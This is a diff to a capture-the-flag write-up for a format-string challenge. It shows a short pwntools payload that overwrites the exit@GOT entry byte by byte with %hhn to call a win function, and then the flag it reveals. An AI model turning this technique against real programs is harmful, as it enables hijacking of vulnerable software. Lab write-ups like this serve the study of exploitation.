@@ -22,11 +22,11 @@ Sending the following format string
 and verifying that the 7th register is filled with `41` (the value of `A`) tell us that we control the 7th register.
 To call the `win` function we need to overwrite the `exit@GOT` address with the address of the `win` function.
 Like in previous challenges, we can write the address byte by byte using the `%hhn` specifier.
-```
-payload =  p32(exit_gop+2) + b'%007$hhn'                   # 8      
-payload += p32(exit_gop+3) + b'%010$hhn'                   # 16
-payload += p32(exit_gop+1) + b'%000120c' + b'%013$hhn'     # 155
-payload += p32(exit_gop+0) + b'%000019c' + b'%018$hhn'     # 132
+```python
+payload =  p32(exit_gop+2) + b'%007$hhn'                       
+payload += p32(exit_gop+3) + b'%010$hhn'                  
+payload += p32(exit_gop+1) + b'%000120c' + b'%013$hhn'     
+payload += p32(exit_gop+0) + b'%000019c' + b'%018$hhn'   
 ```
 Revealing the flag `SSof{You_G_O_T_me}`.
 
